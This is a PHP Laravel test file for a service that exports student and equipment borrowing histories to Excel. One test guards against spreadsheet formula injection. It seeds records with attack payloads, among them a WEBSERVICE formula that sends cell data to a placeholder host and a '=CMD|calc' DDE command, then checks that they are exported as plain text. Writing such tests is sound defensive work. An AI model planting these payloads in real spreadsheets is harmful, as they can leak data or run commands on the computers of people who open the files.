<?php

declare(strict_types=1);

namespace Tests\Feature\Services;

use App\Models\Borrowing;
use App\Models\Equipment;
use App\Models\Profile;
use App\Services\ExportHistoryExcelService;
use Illuminate\Foundation\Testing\LazilyRefreshDatabase;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

class ExportHistoryExcelServiceTest extends TestCase
{
    use LazilyRefreshDatabase;

    public function test_export_student_history_generates_streamed_excel_response(): void
    {
        $profile = Profile::factory()->create([
            'student_code' => '25107002',
            'first_name' => 'ANTONIO',
            'last_name' => 'ABRIOJO',
            'program' => 'Administración',
        ]);

        $equipment = Equipment::factory()->ofType('Computadora')->withStatus('Disponible')->create();

        Borrowing::factory()->create([
            'profile_id' => $profile->id,
            'student_code' => $profile->student_code,
            'equipment_id' => $equipment->id,
            'status' => 'Devuelto',
            'borrowing_date' => now()->subDays(2),
            'return_date' => now()->subDays(2)->addHours(2),
        ]);

        $service = new ExportHistoryExcelService;
        $response = $service->exportStudentHistory($profile);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->headers->get('Content-Type'));
        $this->assertStringContainsString('historial_estudiante_25107002', (string) $response->headers->get('Content-Disposition'));
    }

    public function test_export_equipment_history_generates_streamed_excel_response(): void
    {
        $equipment = Equipment::factory()->ofType('Computadora')->withStatus('Disponible')->create([
            'patrimonial_code' => 'UCH-PC-001',
        ]);

        $profile = Profile::factory()->create([
            'student_code' => '26207006',
            'first_name' => 'SEBASTIAN',
            'last_name' => 'AGUIRRE',
        ]);

        Borrowing::factory()->create([
            'profile_id' => $profile->id,
            'student_code' => $profile->student_code,
            'equipment_id' => $equipment->id,
            'status' => 'Devuelto',
            'borrowing_date' => now()->subDay(),
            'return_date' => now()->subDay()->addHours(1),
        ]);

        $service = new ExportHistoryExcelService;
        $response = $service->exportEquipmentHistory($equipment);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->headers->get('Content-Type'));
        $this->assertStringContainsString('historial_equipo_UCH-PC-001', (string) $response->headers->get('Content-Disposition'));
    }

    /**
     * Las observaciones y textos con prefijo de fórmula deben exportarse explícitamente como
     * cadenas literales (TYPE_STRING) para prevenir inyección de fórmulas en Excel.
     */
    public function test_exported_excel_cells_force_string_type_to_prevent_formula_injection(): void
    {
        $formulaPayload = '=WEBSERVICE("https://example.invalid/?c="&E9)';

        $profile = Profile::factory()->create([
            'student_code' => '=25107002',
            'first_name' => '=SUM(1,1)',
            'last_name' => 'GARCIA',
        ]);

        $equipment = Equipment::factory()->ofType('Laptop')->withStatus('Disponible')->create([
            'patrimonial_code' => 'UCH-LP-900',
            'observations' => '=CMD|calc',
        ]);

        Borrowing::factory()->create([
            'profile_id' => $profile->id,
            'student_code' => $profile->student_code,
            'equipment_id' => $equipment->id,
            'status' => 'Devuelto',
            'observations' => $formulaPayload,
        ]);

        $service = new ExportHistoryExcelService;

        $studentSheet = $this->loadSpreadsheetFromResponse($service->exportStudentHistory($profile))->getActiveSheet();

        $this->assertSame(DataType::TYPE_STRING, $studentSheet->getCell('I9')->getDataType());
        $this->assertSame($formulaPayload, $studentSheet->getCell('I9')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $studentSheet->getCell('B3')->getDataType());
        $this->assertSame('=25107002', $studentSheet->getCell('B3')->getValue());

        $equipmentSheet = $this->loadSpreadsheetFromResponse($service->exportEquipmentHistory($equipment))->getActiveSheet();

        $this->assertSame(DataType::TYPE_STRING, $equipmentSheet->getCell('B6')->getDataType());
        $this->assertSame('=CMD|calc', $equipmentSheet->getCell('B6')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $equipmentSheet->getCell('J9')->getDataType());
        $this->assertSame($formulaPayload, $equipmentSheet->getCell('J9')->getValue());
    }

    private function loadSpreadsheetFromResponse(StreamedResponse $response): Spreadsheet
    {
        ob_start();
        $response->sendContent();
        $binary = (string) ob_get_clean();

        $tempPath = tempnam(sys_get_temp_dir(), 'xlsx_test_');
        $this->assertIsString($tempPath);
        file_put_contents($tempPath, $binary);

        try {
            return IOFactory::load($tempPath);
        } finally {
            if (is_file($tempPath)) {
                @unlink($tempPath);
            }
        }
    }
}
